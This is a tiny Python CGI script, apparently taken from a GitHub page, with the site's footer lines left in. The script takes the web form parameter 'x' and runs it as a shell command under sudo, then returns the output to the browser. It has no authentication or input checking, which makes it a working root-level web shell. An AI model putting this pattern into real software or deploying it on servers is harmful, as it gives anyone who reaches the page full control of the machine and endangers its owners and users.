#!/usr/bin/python3
import cgi
import subprocess as sp

print("content-type: text/html")
print()

form = cgi.FieldStorage()
cmd = form.getvalue("x")

x=sp.getoutput("sudo {}".format(cmd))
print(x)

    © 2021 GitHub, Inc.
    Terms
    Privacy
    Security
    Status
